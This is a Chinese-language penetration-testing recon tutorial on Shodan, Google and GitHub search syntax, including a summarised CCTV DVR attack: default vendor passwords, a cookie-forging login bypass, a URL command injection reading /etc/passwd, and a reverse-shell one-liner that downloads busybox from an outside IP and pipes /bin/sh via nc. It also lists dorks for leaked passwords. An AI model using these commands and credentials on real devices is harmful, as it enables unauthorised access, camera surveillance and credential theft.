# 常见搜索的使用

## Shodan的使用

Shodan是一个搜素互联网链接设备的搜索引擎，不同于Google搜素引擎。用户可在Shodan上使用搜索语法查找链接到互联网的摄像头、路由器、服务器等设备信息。它通过扫描全网设备并抓取解析各个设备返回的banner信息，通过了解这些信息Shodan就能得知网络中哪一种Web服务器是最受欢迎的，或是网络中到底存在多少可匿名登录的FTP服务器。**网站地址：[https://www.shodan.io](https://www.shodan.io/)**。国内其竞品为[ZoomEye](https://www.zoomeye.org/)。

### 搜索语法

+ net：搜索指定的IP地址或子网，例如`[<content>] net:"117.44.67.0/24"`
+ hostname：搜索指定的主机或域名，例如`[<content>] hostname:"sina.com"`
+ port：搜索指定的端口，例如`[<content>] port:"80"`
+ country 搜索指定的国家，例如`[<content>] country:"China"`
+ city：搜索指定的城市，例如`[<content>] city:"Beijing"`
+ product：搜索指定的操作系统/软件，例如`[<content>] product:"linux"`
+ version：搜索指定的软件版本，例如`[<content>] version:"7.1.4"`
+ org：搜索指定的组织或公司，例如`[<content>] org:"Google"`
+ before/after：搜索指定收录时间前后的数据(格式为dd-mm-yy)，例如`[<content>] before:"11-11-15"`

**除了通过搜索以外，还可以点击shodan右侧的“explore”，就可以看到别人分享的搜索语法。**比如一个弱密码的漏洞`Server: uc-httpd 1.0.0 200 OK Country:"China"`。

每次查询完后，点击页面上的 “Exploits” 按钮，Shodan就会帮我们查找针对不同平台、不同类型可利用的exploits(漏洞)。当然也可通过直接访问网址来自行搜索：https://exploits.shodan.io/welcome。

**特别的：注意安全，不要乱搞，看看就行，不要改人家配置和密码。(不乱搞，不出事)**

### 密码破解

搜索完成后，我们可以在概要页面的每一个IP旁边点击“斜向上箭头”或者在详情页面每个端口旁“分享箭头”进入服务器，一般用户名为Admin、admin等，密码为空或者111111、888888、123456等。

AndrewTierney在其Blog上公布了一片有关摄像头漏洞利用的文章https://www.pentestpartners.com/blog/pwning-cctv-cameras/，翻译文章为https://blog.51cto.com/simeon/1744228，归纳其核心如下：

+ 存在弱口令漏洞

  简称为“CCTV”(Mvpower 8 Channel Security DVR Full D1 H.264CCTV Real-time Network Digital Video Recorder Mobile Motion Detection,P2P HDMIAlarm Email for CCTV Surveillance Cmeras System)，如在Amazon的购买地址为http://www.amazon.co.uk/dp/B0162AQCO4，其存在弱口令admin，密码为空。收集的其它几款网络摄像机的口令如下：

   （1）海康威视IP网络摄像机：超级用户：admin/12345

   （2）天地伟业网络摄像机：用户名：Admin/111111

   （3）大华网络摄像机：用户名：admin/888888

+ 登录密码绕过漏洞

  可以对之前用默认密码成功登录的页面进行抓包，找到处理页面登录逻辑的js，对处理页面登录的逻辑分析发现，存在登录绕过漏洞，代码如下：

  ```js
  $(document).ready(function(){
      dvr_camcnt= Cookies.get("dvr_camcnt");
      iSetAble= Cookies.get("iSetAble");
      iPlayBack= Cookies.get("iPlayBack");
      dvr_usr= Cookies.get("dvr_usr");
      dvr_pwd= Cookies.get("dvr_pwd");
      if(iSetAble== '0'){
          $('#pb_settings').css('display','none');
      }
      if(iPlayBack== '0'){
          $('#pb_review').css('display','none');
      }
      if(dvr_camcnt== null || dvr_usr == null || dvr_pwd == null){
          location.href= "/index.html";
      }
  }
  ```

  系统管理页面直接通过js检查cookie是否为空来判断用户是否登录。于是通过伪造cookie便可以绕过登录检查。通过代码可以看到需要伪造三个cookie值，dvr_camcnt，dvr_usr=admin，dvr_pwd=123。直接打开http://xx.xx.xx.xx/view2.html时，抓包发现系统会自动设置该cookie参数的值，这个值需要记录下来，否则后面填错的话是看不到监控内容的。dvr_usr和dvr_pwd可以随便设置，只要不为空就好。保存后重新刷新一下http://xx.xx.xx.xx/view2.html，便可以成功登录系统。

+ 直接获取webshell

  直接访问`<ip>/shell?cat%20/etc/passwd`或`<ip>shell?cat%20/tmp/usrm.ini`即可获取服务器root帐号密码。

+ 获取反弹shell

  执行命令：`cd/root/rec/a1 && wget http://212.111.43.161/busybox && chmod +x busybox && ./busybox  nc 122.115.47.398000 -e /bin/sh -e /bin/sh`，将反弹shell至122.115.47.39的8000端口。还可以执行命令`http://www.antian365.com/shell?/usr/sbin/telnetd-l/bin/sh -p 25`通过telnet目标IP直接进入系统。

实战例子请参考翻译文章。



## Google的使用

Google Hacking是利用谷歌搜索的强大，在浩瀚的互联网中搜索到我们需要的信息。轻量级的搜索可以搜素出一些遗留后门等；中量级的搜索出一些用户信息或源代码泄露等；重量级的则可能是mdb文件下载，网站配置密码，php远程文件包含漏洞等重要信息。**网站地址：[https://www.google.com/ncr](https://www.google.com/ncr)**。国内其竞品为[Baidu](https://www.baidu.com/)。

### 基本搜索

+ 通配符：`*`和`?`
+ 逻辑与：`+`，如`google + android`，搜索包含google且android的页面
+ 逻辑或：`|`，如`google | android`，搜索包含google或android的页面
+ 逻辑非：`-`，如`google -android`，搜索包含google且不包含android的页面

### 高级搜索

+ cache：将返回存储下来的历史页面。例如`cache:www.hackingspirits.com guest`将返回指定网站的缓存，并且正文中含有guest
+ info：返回指定站点的信息。例如`info:www.baidu.com`将返回百度的一些信息
+ site：指定访问的站点。例如`site:baidu.com inurl:Login`将只在baidu.com中查找url中含有Login的网页
+ (all)inurl：将返回url中含有关键词的网页。例如`inurl:Login`将返回url中含有Login的网页
+ (all)intitle：将返回标题中含有关键字的网页。例如`intitle:后台登录`将只返回标题中包含"后台登录"的网页
+ (all)intext：将返回正文中含有关键字的网页。例如`intext:后台登录`将只返回正文中包含"后台登录"的网页
+ filetype：指定访问的文件类型。例如`site:baidu.com filetype:pdf`将只返回baidu.com上文件类型为pdf的网页

而上面这些命令中用的最多的就是inurl，利用这个命令可以查到很多意想不到的东西。如查找SQL注入`inurl:?id=1`。

### 常见搜索

+ 查找网站后台
  + `site:xx.com inurl:login`
  + `site:xx.com intitle:后台`
  + `site:xx.com intext:管理`
+ 查看上传漏洞
  + `site:xx.com inurl:file`
  + `site:xx.com inurl:load`
+ 查看服务器使用的程序
  + `site:xx.com filetype:php`
  + `site:xx.com filetype:jsp`
  + `site:xx.com filetype:asp`
  + `site:xx.com filetype:aspx`



## Github的使用

在渗透测试的信息收集阶段，可以去Github和码云上搜索与目标有关的信息，或者就有意想不到的收获。有些开发人员将代码上传到代码库的时候，有可能连一些重要的配置信息也上传了。Github的搜素语法：

```
user:test                  #用户名搜素
license:apache test        #仓库的LICENSE搜索关键字
language:java test         #在java语言的代码中搜索关键字

in:name test               #在仓库标题中搜索含有关键字
in:readme test             #在readme文件中搜索含有关键字
in:descripton test         #在仓库描述中搜索含有关键字

pushed:>2019-02-12 test    #发布时间大于2019-02-12的搜索关键字
created:>2019-02-12 test   #创建时间大于2019-02-12的搜索关键字

size:>=5000 test           #指定仓库大于5000k(5M)的搜索关键字
stars:>3000 test           #stars数量大于3000的搜索关键字
stars:1000..3000 test      #stars数量大于1000小于3000的搜索关键字
forks:>1000 test           #forks数量大于1000的搜索关键字
forks:1000..3000 test      #forks数量大于1000小于3000的搜索关键字

user:test in:name test     #组合搜索,用户名test的标题含有test的
```

### 使用Github进行邮件配置信息收集

很多网站及系统都会使用pop3和smtp发送来邮件，不少开发者由于安全意识不足会把相关的配置信息也放到Github上，所以如果这时候动用一下google搜索命令语句，构造一下关键字，就能把这些信息给找出来了：

```
site:Github.com smtp
site:Github.com smtp @baidu.com
site:Github.com smtp password
site:Github.com String password smtp
```

### 使用Github进行DB信息收集

```
site:Github.com sa password
site:Github.com root password
site:Github.com User ID=’sa’;Password
site:Github.com inurl:sql
```

### 使用Github进行SVN信息收集

```
site:Github.com svn
site:Github.com svn username
site:Github.com svn password
site:Github.com svn username password
```

### 使用Github进行综合信息收集

```
site:Github.com password
site:Github.com ftp ftppassword
site:Github.com 密码
site:Github.com 内部
```

